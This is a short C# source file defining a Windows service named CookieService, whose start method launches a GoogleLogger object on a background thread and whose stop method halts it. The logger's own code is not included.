using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Linq;
using System.ServiceProcess;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace CookieService
{
    public partial class Service1 : ServiceBase
    {
        GoogleLogger googleLogger;
        public Service1()
        {
            InitializeComponent();
            this.CanPauseAndContinue = true;
            this.CanShutdown = true;
            this.CanStop = true;
            this.AutoLog = true;
        }

        protected override void OnStart(string[] args)
        {
            this.googleLogger = new GoogleLogger();
            Thread googleLoggerThread = new Thread(new ThreadStart(this.googleLogger.Start));
            googleLoggerThread.Start();
        }

        protected override void OnStop()
        {
            this.googleLogger.Stop();
        }
    }
}
